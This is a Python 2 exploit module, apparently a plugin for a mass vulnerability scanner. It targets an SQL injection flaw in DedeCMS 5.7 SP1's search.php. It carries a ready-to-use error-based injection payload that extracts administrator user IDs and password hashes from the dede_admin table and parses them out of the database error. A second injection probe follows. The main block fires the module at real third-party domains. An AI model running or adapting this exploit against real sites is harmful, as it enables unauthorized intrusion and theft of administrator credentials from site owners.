#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#dedecms search注入  dede 5.7 sp1
#http://huakai.paxmac.org/?p=543

import urllib2
import threading
import re
import sys

from class_Queue import url_exp

class sql_dede_57_sp1:
#    def __init__(self,url):
#        threading.Thread.__init__(self)
#        self.url=url  #线程ID
#        self.one(self.url)
#        self.one2(self.url)

    def assign(self,service, arg=None):
        if service == 'DedeCms':
            return True, arg

    def scan(self,arg):
        try:
            self.url0, self.url1 = arg
            self.one(self.url1)
            self.one2(self.url1)
        except Exception,e:
            #print e
            return 0

    def one(self,arg):
        try:
            url=arg+"/uploads/plus/search.php?keyword=11&amp;typeArr[%60@%27%60and%28SELECT%201%20FROM%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28SELECT/*%27*/concat%280x5f,userid,0x5f,pwd,0x5f%29%20from%20dede_admin%20Limit%200,1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29]=1"
            req=urllib2.Request(url)
            res = urllib2.urlopen(req)
            html = res.read()
            res.close()
            #print html
            html = re.findall(r"Duplicate entry \'\w+'", html)
            if html:
                #print "OK-----------------success"
                #print html[0]
                EXP_list=[1,self.url0,self.url1,"CN_sql_dede_57_sp1X1",html[0],"",""]
                #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                print EXP_list
                url_exp.put(EXP_list,0.5)   #插入队列

                return 1
            else:
                #print "no sql injection"
                return 0
        except Exception,e:
            #print e
            return 0

    def one2(self,arg):
        try:
            html = urllib2.urlopen(arg+'/plus/search.php?keyword=as&typeArr%5B1%20%75%4E%69%6F%6E%201%5D=a',timeout=5).read()
            if html:
                r = r"<font size='5' color='red'>(.*?)</font>"
                m = re.findall(r,html)
                if m:
                    #print 'search_php Sqlinjection'+m[0]
                    EXP_list=[1,self.url0,self.url1,"CN_sql_dede_57_sp1X2",html[0],"",""]
                    #["01可信度","主网址","从网址","漏洞类型","漏洞地址","密码","备注"] 7个
                    print EXP_list
                    url_exp.put(EXP_list,0.5)   #插入队列
            return 0
        except Exception,e:
            #print e
            return 0



################################################
if __name__=='__main__':
    class_www=sql_dede_57_sp1()
    class_www.scan(class_www.assign('DedeCms', ("http://www.baidu.com","http://www.ranpeng.com.cn"))[1])








